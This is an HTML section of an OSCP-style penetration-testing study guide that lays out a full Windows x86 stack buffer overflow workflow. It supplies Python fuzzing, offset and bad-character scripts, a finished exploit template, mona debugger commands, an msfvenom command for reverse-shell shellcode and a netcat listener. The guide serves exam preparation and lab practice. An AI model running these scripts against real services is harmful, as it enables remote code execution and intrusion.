@@ -1,0 +1,343 @@
+<h2 id="ref-17-buffer-overflow-windows-x86-complete-workflow">17. BUFFER OVERFLOW --- WINDOWS x86 (COMPLETE WORKFLOW)</h2>
+<blockquote>
+<p>⚠️ <strong>Exam note:</strong> the dedicated, separately-scored BOF machine was
+removed from the OSCP exam in the Nov 2024 format change --- it's no
+longer a guaranteed target. A BOF can still surface as the low-priv
+vector on one of the 3 standalone machines (worth that machine's
+normal 10+10, not a bonus 20), and the skill still matters for PEN-200
+generally and for OSED later --- so this section stays as reference.
+Just don't plan exam-day timing around "guaranteed free points from a
+BOF box."</p>
+</blockquote>
+<details id="ref-17-0-bof-mindset-setup">
+<summary>★ 17.0 BOF Mindset &amp; Setup</summary>
+<pre class="ref-code"><code>OSCP BOF IS ALWAYS:
+  ✓ Windows x86 (32-bit target application)
+  ✓ Stack-based overflow (classic, no heap spray)
+  ✓ Known application with known vulnerable command
+  ✓ You have access to the application to fuzz locally
+  ✓ No ASLR/DEP on the module used for JMP ESP
+
+TOOLS:
+  ✓ Immunity Debugger (on Windows VM)
+  ✓ mona.py plugin (copy to Immunity's PyCommands folder)
+  ✓ Kali Linux (for pattern gen, msfvenom)
+
+FIRST COMMAND IN IMMUNITY:
+  !mona config -set workingfolder C:\mona\%p
+
+TARGET TIME: 20 minutes or less
+
+THE 7 STEPS:
+  1. Fuzz → find crash byte count
+  2. Pattern → find exact EIP offset  
+  3. Control EIP → verify with BBBB
+  4. Bad chars → find what bytes corrupt shellcode
+  5. JMP ESP → find reliable return address
+  6. Shellcode → generate with msfvenom
+  7. Exploit → combine + fire
+</code></pre>
+</details>
+<details id="ref-17-1-step-1-fuzz-the-application">
+<summary>💥 17.1 Step 1 --- Fuzz the Application</summary>
+<pre class="ref-code"><code class="language-python">#!/usr/bin/env python3
+# fuzz.py — find crash point
+import socket, time, sys
+
+ip   = "TARGET_IP"
+port = TARGET_PORT
+prefix = "OVERFLOW1 "    # ← change per challenge (OVERFLOW1..OVERFLOW10)
+
+buffer = b"A" * 100
+while True:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(5)
+            s.connect((ip, port))
+            s.recv(1024)
+            print(f"[*] Sending {len(prefix) + len(buffer)} bytes...")
+            s.send(bytes(prefix, "latin-1") + buffer + b"\r\n")
+            s.recv(1024)
+    except Exception as e:
+        print(f"\n[+] Crash at approximately {len(buffer)} bytes!")
+        sys.exit(0)
+    buffer += b"A" * 100
+    time.sleep(0.5)
+</code></pre>
+<pre class="ref-code"><code># In Immunity: Run the app → Run fuzz.py → app crashes → note byte count
+# Restart the app: Debug → Restart (Ctrl+F2) → Run (F9)
+</code></pre>
+</details>
+<details id="ref-17-2-step-2-find-exact-eip-offset">
+<summary>📐 17.2 Step 2 --- Find Exact EIP Offset</summary>
+<pre class="ref-code"><code class="language-bash"># Generate pattern slightly longer than crash count:
+msf-pattern_create -l 2400   # Use crash_count + 400
+
+# In script — replace A*100 with the pattern output
+# Run → App crashes → note EIP value in Immunity (e.g. 386F4337)
+
+# Find the offset:
+msf-pattern_offset -l 2400 -q 386F4337
+# OR in Immunity:
+# !mona findmsp -distance 2400
+</code></pre>
+<pre class="ref-code"><code class="language-python"># Step 2 script: send_pattern.py
+import socket
+ip   = "TARGET_IP"
+port = TARGET_PORT
+prefix = "OVERFLOW1 "
+offset = 0    # Will be 0 for now
+overflow = "Aa0Aa1Aa2..."   # Paste msf-pattern_create output here
+retn = ""
+padding = ""
+payload = prefix + overflow + retn + padding + "\r\n"
+with socket.socket() as s:
+    s.connect((ip, port)); s.recv(1024)
+    s.send(bytes(payload, "latin-1"))
+    print("[*] Pattern sent — check EIP in Immunity")
+</code></pre>
+</details>
+<details id="ref-17-3-step-3-control-eip">
+<summary>🎯 17.3 Step 3 --- Control EIP</summary>
+<pre class="ref-code"><code class="language-python"># Step 3 script: control_eip.py — verify offset is correct
+import socket
+ip   = "TARGET_IP"
+port = TARGET_PORT
+prefix = "OVERFLOW1 "
+offset = 1978   # ← your calculated offset
+overflow = b"A" * offset
+retn = b"BBBB"        # Should appear as 42424242 in EIP register
+padding = b"C" * (3000 - offset - 4)
+
+with socket.socket() as s:
+    s.connect((ip, port)); s.recv(1024)
+    s.send(bytes(prefix, "latin-1") + overflow + retn + padding + b"\r\n")
+    print("[*] Check Immunity — EIP should be 42424242, ESP points to CCCCs")
+</code></pre>
+</details>
+<details id="ref-17-4-step-4-bad-characters">
+<summary>🚫 17.4 Step 4 --- Bad Characters</summary>
+<pre class="ref-code"><code class="language-python"># Step 4 script: find_badchars.py
+import socket
+
+ip   = "TARGET_IP"
+port = TARGET_PORT
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = b"A" * offset
+retn = b"BBBB"
+
+# Start with all bytes EXCEPT \x00 (null — always bad)
+# Remove known bad chars as you discover them
+badchars = (
+    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)
+
+with socket.socket() as s:
+    s.connect((ip, port)); s.recv(1024)
+    s.send(bytes(prefix, "latin-1") + overflow + retn + badchars + b"\r\n")
+    print("[*] Badchars sent — check ESP dump in Immunity")
+</code></pre>
+<pre class="ref-code"><code># MONA WORKFLOW (faster than manual):
+# 1. Generate reference bytearray in Immunity:
+!mona bytearray -b "\x00"           ← start with just null
+
+# 2. Send the badchars payload, note ESP value when it crashes
+
+# 3. Compare memory at ESP with reference:
+!mona compare -f C:\mona\APPNAME\bytearray.bin -a 0x00DEFF88   ← your ESP address
+
+# 4. Mona output shows: "Corrupt" or list of bad bytes
+#    e.g., "0a 0d" = \x0a and \x0d are bad
+
+# 5. Remove from badchars array AND regenerate bytearray:
+!mona bytearray -b "\x00\x0a\x0d"
+
+# 6. Repeat until output shows: "Status: OK - No badchars found!"
+# NOTE: When mona says \x09 is bad, also test \x0a — one bad char can
+# corrupt the next byte making it look bad too (cascading effect)
+</code></pre>
+</details>
+<details id="ref-17-5-step-5-find-jmp-esp">
+<summary>🔀 17.5 Step 5 --- Find JMP ESP</summary>
+<pre class="ref-code"><code># In Immunity Debugger:
+
+# List all modules and their protections:
+!mona modules
+
+# Output columns: Module | Rebase | SafeSEH | ASLR | NXCompat | OS DLL
+# WANT: all False/False/False/False for the module you pick
+# AVOID: any module with True (especially ASLR)
+
+# Find JMP ESP addresses in safe module (with bad chars excluded):
+!mona jmp -r esp -cpb "\x00\x0a\x0d"
+
+# Alternative — find raw opcode (FF E4 = JMP ESP):
+!mona find -s "\xff\xe4" -m module_name.dll
+
+# Mona creates: C:\mona\APPNAME\jmp.txt
+# Open it → pick an address → note in LITTLE ENDIAN format
+
+# EXAMPLE:
+# Address: 0x625011AF
+# Little endian in Python: b"\xaf\x11\x50\x62"
+# Little endian in hex:    \xaf\x11\x50\x62
+
+# VERIFY: Set breakpoint on that address
+# In Immunity: Go to address (Ctrl+G) → type address → F2 (set BP)
+# Run exploit → should hit BP → confirms JMP ESP works
+</code></pre>
+</details>
+<details id="ref-17-6-step-6-generate-shellcode">
+<summary>💣 17.6 Step 6 --- Generate Shellcode</summary>
+<pre class="ref-code"><code class="language-bash"># Use EXACT same bad chars you found in step 4!
+# EXITFUNC=thread prevents the whole service from crashing
+
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST=YOUR_LHOST \
+  LPORT=YOUR_LPORT \
+  EXITFUNC=thread \
+  -f python \
+  -b "\x00\x0a\x0d"        # ← YOUR bad chars here
+
+# Output will look like:
+# buf =  b""
+# buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5..."
+
+# Copy the entire buf = ... block
+# Shellcode size is typically ~350-400 bytes
+# NOP sled of 16 bytes is enough padding before shellcode
+</code></pre>
+</details>
+<details id="ref-17-7-step-7-final-exploit">
+<summary>🚀 17.7 Step 7 --- Final Exploit</summary>
+<pre class="ref-code"><code class="language-python">#!/usr/bin/env python3
+# exploit.py — THE FINAL EXPLOIT
+import socket
+
+ip   = "TARGET_IP"
+port = TARGET_PORT
+
+# ── FILL THESE IN ─────────────────────────────────────────────
+prefix   = "OVERFLOW1 "   # The vulnerable command
+offset   = 1978           # Exact EIP offset
+retn     = b"\xaf\x11\x50\x62"  # JMP ESP in little endian
+padding  = b"\x90" * 16  # NOP sled (16 bytes is plenty)
+
+# Paste msfvenom -f python output below:
+buf =  b""
+buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
+buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
+# ... (full shellcode here)
+
+# ── BUILD PAYLOAD ─────────────────────────────────────────────
+payload = bytes(prefix, "latin-1") + b"A" * offset + retn + padding + buf + b"\r\n"
+
+# ── FIRE ──────────────────────────────────────────────────────
+print(f"[*] Payload size: {len(payload)} bytes")
+print(f"[*] Sending exploit to {ip}:{port}...")
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((ip, port))
+    s.recv(1024)
+    s.send(payload)
+    print("[+] Done! Check your listener...")
+</code></pre>
+<pre class="ref-code"><code class="language-bash"># Start listener BEFORE running exploit:
+rlwrap -cAr nc -nvlp YOUR_LPORT
+# -cAr gives history and better line editing in the interactive shell
+</code></pre>
+</details>
+<details id="ref-17-8-mona-quick-reference-all-commands">
+<summary>📋 17.8 Mona Quick Reference --- All Commands</summary>
+<pre class="ref-code"><code># ── SETUP ─────────────────────────────────────────────────────
+!mona config -set workingfolder C:\mona\%p
+
+# ── PATTERN ───────────────────────────────────────────────────
+!mona pc 2400                # Pattern create (length 2400)
+!mona po 386F4337            # Pattern offset for EIP value
+!mona findmsp -distance 2400 # Find all pattern matches in memory
+
+# ── BYTEARRAY ─────────────────────────────────────────────────
+!mona bytearray -b "\x00"
+!mona bytearray -b "\x00\x0a\x0d\x25\x26\x2b\x3d"  # All bad chars
+
+# ── COMPARE ───────────────────────────────────────────────────
+!mona compare -f C:\mona\APP\bytearray.bin -a 0xDEADBEEF
+# Status: OK = no more bad chars | Corrupted = still more to find
+
+# ── MODULES ───────────────────────────────────────────────────
+!mona modules
+# Shows: Module, Base, Top, Rebase, SafeSEH, ASLR, NXCompat, OS DLL
+
+# ── JMP ESP ───────────────────────────────────────────────────
+!mona jmp -r esp -cpb "\x00\x0a\x0d"
+!mona jmp -r esp -m "module.dll" -cpb "\x00"
+!mona find -s "\xff\xe4" -m module.dll    # Manual opcode search
+
+# ── SUGGEST ───────────────────────────────────────────────────
+!mona suggest    # Suggests exploit structure after crash
+
+# ── STACK / REGISTERS ─────────────────────────────────────────
+!mona seh -cpb "\x00"       # Find SEH gadgets (for SEH overflows)
+!mona nosafeseh             # Find modules without SafeSEH
+
+# ── EGGHUNTER ─────────────────────────────────────────────────
+!mona egg -t w00t           # Generate egghunter for tag "w00t"
+
+# ── OUTPUT LOCATION ───────────────────────────────────────────
+# All output → C:\mona\APPNAME\
+# Key files: jmp.txt, bytearray.bin, compare.txt, modules.txt
+</code></pre>
+</details>
+<details id="ref-17-9-common-bof-problems-fixes">
+<summary>🔧 17.9 Common BOF Problems &amp; Fixes</summary>
+<pre class="ref-code"><code>PROBLEM: EIP shows "41414141" after sending pattern
+FIX: Pattern wasn't long enough — increase msf-pattern_create -l value
+
+PROBLEM: EIP not overwritten even with correct offset
+FIX: Check if there's a length check in the protocol — try different prefix
+
+PROBLEM: Shellcode not executing even with correct JMP ESP
+FIX: 
+  1. Bad chars in shellcode — recheck byte array
+  2. Not enough space — verify ESP has 400+ bytes available
+  3. NOP sled too short — increase to 32 bytes
+  4. EXITFUNC wrong — use EXITFUNC=thread
+
+PROBLEM: Shell connects but dies immediately
+FIX: Use EXITFUNC=thread in msfvenom
+
+PROBLEM: "No badchars found" but exploit still fails  
+FIX: The \x00 you assumed is bad might be fine — test explicitly
+
+PROBLEM: All JMP ESP addresses have bad chars in them
+FIX: Look in other modules — use !mona jmp -r esp (no -m flag)
+     Try CALL ESP, PUSH ESP/RET combos
+
+PROBLEM: App crashes before reaching shellcode
+FIX: Shellcode corrupted — re-run bad char analysis from scratch
+
+PRO TIPS:
+  - Always restart app cleanly between each test (Ctrl+F2 then F9)
+  - Verify ESP address fresh each run — may differ by small amount
+  - 16 NOP bytes before shellcode is standard; increase if issues
+  - Generate shellcode with -f python for cleaner copy-paste
+  - Use rlwrap -cAr nc -nvlp PORT for better shell interaction
+</code></pre>
+</details>
+<hr/>
